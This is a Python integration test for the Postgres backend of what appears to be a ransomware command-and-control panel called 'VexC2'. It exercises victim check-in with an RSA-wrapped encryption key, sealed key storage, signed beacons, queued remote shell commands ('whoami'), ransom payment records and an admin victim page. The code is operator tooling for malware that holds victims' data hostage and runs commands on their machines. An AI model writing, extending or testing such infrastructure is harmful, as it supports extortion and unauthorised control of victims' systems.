#!/usr/bin/env python3
"""Postgres integration smoke test.

Skipped unless VEX_TEST_PG is set. Run on the VPS (or any host with
postgresql-client) after creating an empty database:

    $env:VEX_TEST_PG = "postgresql://vex:pass@127.0.0.1:5432/vex"
    $env:VEX_PASS = "admin-pass"
    python tools\\pg_integration.py

It exercises the same data paths as the SQLite suite: schema init, checkin,
sealed key, signed ping, command dispatch/report, payment and the victim page.
"""

import base64
import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
URL = os.environ.get("VEX_TEST_PG", "").strip()

CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def main() -> int:
    if not URL:
        print("[skip] VEX_TEST_PG not set")
        return 0
    if os.environ.get("VEX_TEST_PG_ALLOW_DROP") != "1":
        print("[skip] refusing to DROP tables: set VEX_TEST_PG_ALLOW_DROP=1 "
              "and point VEX_TEST_PG at a dedicated test database")
        return 0
    dbname = URL.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0].lower()
    if "test" not in dbname and "ci" not in dbname:
        print(f"[skip] database name {dbname!r} does not look like a test DB")
        return 0

    os.environ["VEX_DB_URL"] = URL
    os.environ.setdefault("VEX_PASS", "pg-admin-pass")
    os.environ.setdefault("VEX_MASTER", "pg-master-pass")
    os.environ.setdefault("VEX_PRIV", os.path.join(ROOT, "VexC2", "priv.pem"))
    os.environ.setdefault("VEX_SECRET", "p" * 64)

    sys.path.insert(0, os.path.join(ROOT, "VexC2"))
    import c2db  # noqa: E402
    import crypto_util  # noqa: E402
    import vault  # noqa: E402
    import app as c2  # noqa: E402
    from Crypto.PublicKey import RSA  # noqa: E402
    from Crypto.Cipher import PKCS1_OAEP  # noqa: E402
    from Crypto.Hash import SHA256  # noqa: E402
    import hashlib  # noqa: E402
    import hmac  # noqa: E402
    import time  # noqa: E402
    import urllib.parse  # noqa: E402

    # clean slate for repeatable runs
    with c2db.db() as conn:
        for table in ("victims", "events", "settings", "operators", "reports",
                      "commands", "payments", "uploads", "templates", "payouts"):
            conn.execute(f"DROP TABLE IF EXISTS {table}")
        conn.commit()

    c2db.init_db()
    ok("schema init", c2db.get_setting("portal_title", "") != "")

    priv = RSA.import_key(open(os.environ["VEX_PRIV"], "rb").read())
    key_raw = bytes(range(32))
    wrapped = base64.b64encode(
        PKCS1_OAEP.new(priv.publickey(), hashAlgo=SHA256).encrypt(key_raw)).decode()

    CL = c2.app.test_client()
    vid = "pgvid00000000001"
    r = CL.post("/api/checkin", data={"vid": vid, "key": wrapped,
                                      "host": "PGC2", "user": "u", "os": "linux"})
    ok("checkin", r.status_code == 200)
    v = c2db.get_victim(vid)
    ok("sealed key", (v["aes_key"] or "").startswith("enc:v1:"))
    ok("key roundtrip", vault.reveal(v["aes_key"]) == base64.b64encode(key_raw).decode())

    secret = vault.reveal(v["secret"])
    ts = str(int(time.time()))
    mac = hmac.new(base64.b64decode(secret),
                   f"{ts}|/api/ping|".encode(), hashlib.sha256).hexdigest()
    body = CL.get("/api/ping?vid=" + urllib.parse.quote(vid),
                  headers={"X-Vex-Ts": ts, "X-Vex-Sig": mac}).data.decode()
    ok("signed ping", body.splitlines()[0] == "sleep", body)

    c2db.queue_command(vid, "shell", "whoami")
    body = CL.get("/api/ping?vid=" + urllib.parse.quote(vid),
                  headers={"X-Vex-Ts": str(int(time.time())),
                           "X-Vex-Sig": hmac.new(
                               base64.b64decode(secret),
                               f"{int(time.time())}|/api/ping|".encode(),
                               hashlib.sha256).hexdigest()}).data.decode()
    ok("command claimed", "cmd=" in body, body)
    if "cmd=" in body:
        cid = body.split("cmd=")[1].split("|")[0]
        out = base64.b64encode(b"pg-user").decode()
        raw = urllib.parse.urlencode({"vid": vid, "kind": "cmdout",
                                      "detail": f"{cid}|shell|{out}"}).encode()
        ts = str(int(time.time()))
        mac = hmac.new(base64.b64decode(secret),
                       f"{ts}|/api/report|".encode() + raw,
                       hashlib.sha256).hexdigest()
        CL.post("/api/report", data=raw,
                content_type="application/x-www-form-urlencoded",
                headers={"X-Vex-Ts": ts, "X-Vex-Sig": mac})
        with c2db.db() as conn:
            row = conn.execute("SELECT status, output FROM commands WHERE id=?",
                               (cid,)).fetchone()
        ok("cmdout stored", row and row["status"] == "done" and row["output"] == "pg-user")

    total = c2db.add_payment(vid, 50.0, "pg test", "", "admin", "admin")
    ok("payment", total >= 50.0)

    CL.get("/admin/logout")
    page = CL.get("/admin/login").data
    tok = page.split(b'name="csrf" value="')[1].split(b'"')[0].decode()
    r = CL.post("/admin/login", data={"csrf": tok, "username": "admin",
                                      "password": os.environ["VEX_PASS"]})
    ok("admin login", r.status_code == 302)
    ok("victim page", b"PGC2" in CL.get("/admin/victim/" + vid).data)

    bad = [n for n, s in CHECKS if not s]
    print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
